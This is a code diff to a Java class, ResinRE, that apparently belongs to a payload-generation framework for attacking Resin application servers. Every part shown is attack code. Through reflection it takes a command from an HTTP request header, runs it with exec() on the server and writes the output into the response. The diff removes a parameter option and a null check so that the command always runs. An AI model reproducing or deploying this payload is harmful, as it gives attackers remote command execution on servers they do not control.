@@ -23,10 +23,9 @@ import java.lang.reflect.Method;
  */
 @Middleware(Middleware.Resin)
 @JavaClassType(JavaClassType.Default)
-@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
+@JavaClassModifiable({JavaClassModifiable.HEADER})
 public class ResinRE {
     private static String HEADER;
-    private static String PARAM;
 
     public ResinRE() {
         try {
@@ -45,19 +44,13 @@ public class ResinRE {
                     Object request = value;
                     Object response = invokeMethod(request, "getResponseFacade", new Class[]{}, new Object[]{});
                     Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-
-                    if (header != null) {
-                        String result = exec((String) header);
-                        invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
-                        Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
-                        invokeMethod(writer, "write", new Class[]{char[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.toCharArray(), 0, result.toCharArray().length});
-                        invokeMethod(writer, "close", new Class[]{}, new Object[]{});
-                        invokeMethod(writer, "flush", new Class[]{}, new Object[]{});
-
-                        return;
-                    }
-
-
+                    String result = exec((String) header);
+                    invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+                    Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
+                    invokeMethod(writer, "write", new Class[]{char[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.toCharArray(), 0, result.toCharArray().length});
+                    invokeMethod(writer, "close", new Class[]{}, new Object[]{});
+                    invokeMethod(writer, "flush", new Class[]{}, new Object[]{});
+                    return;
                 }
             }
 
